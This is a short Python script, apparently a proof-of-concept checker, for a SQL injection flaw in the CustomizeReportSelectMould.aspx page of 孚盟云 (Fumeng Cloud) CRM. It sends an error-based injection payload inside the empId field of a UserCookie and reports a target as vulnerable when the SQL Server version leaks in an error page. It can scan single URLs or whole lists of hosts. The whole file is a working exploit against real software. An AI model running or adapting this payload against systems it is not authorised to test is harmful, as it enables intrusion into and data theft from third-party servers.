import requests
from requests import RequestException
import argparse

requests.packages.urllib3.disable_warnings()


def check(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "Accept": "*/*",
        }

    url = '/m/Dingding/CustomizeReport/CustomizeReportSelectMould.aspx'

    if not target.startswith('http'):
        target = f'http://{target}'

    cookies = {"UserCookie":"{\"empId\":\"admin' and 1=convert(int, @@version)--+-\",\"corpId\": \"1\"}"}

    try:
        resp = requests.get(target + url,  headers=headers, cookies=cookies, verify=False, timeout=30)
        if resp.status_code == 500 and '在将 nvarchar 值' in resp.text:
            print(f"{target} 存在漏洞")
        else:
            print(f"{target} 不存在漏洞")
    except RequestException as e:
        print(e)


def main(args):
    if args.file:
        try:
            with open(args.file, 'r') as f:
                filecontent = f.readlines()
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            exit(1)
        for i in filecontent:
            check(i.strip())
    else:
        check(args.url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="检测孚盟云CRM CustomizeReportSelectMould.aspx SQL注入漏洞")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-f", "--file", help="Test url file")

    args = parser.parse_args()
    main(args)

